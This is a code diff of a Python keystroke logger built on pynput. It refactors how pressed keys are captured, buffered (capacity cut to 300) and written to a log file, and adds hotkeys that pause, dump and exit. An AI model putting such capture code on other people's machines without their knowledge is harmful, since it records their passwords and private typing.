@@ -1,3 +1,5 @@
+import asyncio
+import threading
 from time import sleep
 
 from util import utilities
@@ -7,7 +9,6 @@ from pynput.keyboard import Key, Listener, KeyCode, Controller
 from countdown import Countdown
 from decorators.decorators import catch_exception
 
-# eng_printable_bounds = [33,126]
 S_code = 83
 P_code = 80
 D_code = 68
@@ -18,33 +19,41 @@ is_alt_pressed:bool = False
 is_shift_pressed:bool = False
 should_register:bool = True
 key_buffer:list[str] = list()
-buffer_capacity:int = 1000
+buffer_capacity:int = 300
 lang_change_listener:Listener
 _keyboard = Controller()
 
 
+@catch_exception(print_trace=True)
 def on_pressed(key):
-    if not should_register:
-        return
-
-    global key_buffer
-    if key == Key.backspace:
-        if len(key_buffer) > 0:
-            del key_buffer[-1]
+    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed
+    if isinstance(key, KeyCode):
+        if is_ctrl_pressed or is_alt_pressed:
+            __check_for_special_handling(ord(key.char))
+        else:
+            if should_register:
+                print(key.char)
+                key_buffer.append(key.char)
     else:
-        result = __get_char_of_key(key)
-        if result is not None:
-            key_buffer.append(result)
-            if len(key_buffer) >= buffer_capacity:
-                logger.log_to_file(buffer=key_buffer)
-                key_buffer = list()
-            print('{}'.format(result))
+        if __check_for_combination_key(key):
+            return
+
+        if should_register:
+            if key == Key.space:
+                print(" ")
+                key_buffer.append(" ")
+            elif key == Key.backspace:
+                if len(key_buffer) > 0:
+                    del key_buffer[-1]
+            elif key == Key.enter:
+                print("\n")
+                key_buffer.append("\n")
+
+    if len(key_buffer) == buffer_capacity:
+        logger.log_to_file(buffer=key_buffer)
 
 
 def on_release(key):
-    if not should_register:
-        return
-
     if key == Key.ctrl_l:
         global is_ctrl_pressed
         is_ctrl_pressed = False
@@ -56,34 +65,20 @@ def on_release(key):
         is_shift_pressed = False
 
 
-# print(ord(getattr(key,'char',0)))
-# @catch_exception
-def __get_char_of_key(key) -> chr:
+def __check_for_combination_key(key) -> bool:
     global is_ctrl_pressed, is_alt_pressed, is_shift_pressed
 
-    if should_register:
-        if isinstance(key,KeyCode):
-            if is_ctrl_pressed or is_alt_pressed or is_shift_pressed or ord(key.char) < 32:
-                __check_for_special_handling(ord(key.char))
-                return None
-
-            return key.char
-        elif key == Key.space:
-            return " "
-        elif key == Key.enter:
-            return "\n"
-
-    if not is_ctrl_pressed and key == Key.ctrl_l:
+    if key == Key.ctrl_l:
         is_ctrl_pressed = True
-        return None
-    elif not is_alt_pressed and key == Key.alt_l:
+        return True
+    elif key == Key.alt_l:
         is_alt_pressed = True
-        return None
-    elif not is_shift_pressed and key == Key.shift_l:
+        return True
+    elif key == Key.shift_l:
         is_shift_pressed = True
-        return None
-    else:
-        return None
+        return True
+
+    return False
 
 
 def __check_for_special_handling(unicode):
@@ -98,24 +93,29 @@ def __check_for_special_handling(unicode):
             logger.log_to_file(key_buffer)
             key_buffer = list()
         elif unicode == T_code:     #wait for logging to complete if ongoing, and exit
-            count = 0
-            while logger.is_writing and count < 5:
-                print('was writing, trying again...')
-                count += 1
-                sleep(0.15)
+            __exit_safely()
 
-            __shutdown_executors()
-            if count == 5:
-                exit(-1)
-            exit(0)
+
+def __exit_safely():
+    count = 0
+    while logger.is_writing and count < 5:
+        count += 1
+        sleep(0.1)
+    __shutdown_executors()
+    if count == 5:
+        exit(-1)
+    exit(0)
 
 
 def __init_executors():
     logger.init()
+    # Countdown.make_and_start("one", 0.7, lambda : print("ONE callback"))
+    # Countdown.make_and_start("two", 1, lambda : print("TWO callback"))
 
 
 def __shutdown_executors():
     logger.shutdown()
+    Countdown.stop_all()
 
 
 # ________________________________________ START _________________________________________________
@@ -124,6 +124,5 @@ def __shutdown_executors():
 __init_executors()
 
 with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
-    # print('# of threads: {}'.format(threading.activeCount()))
     listener.join()
 
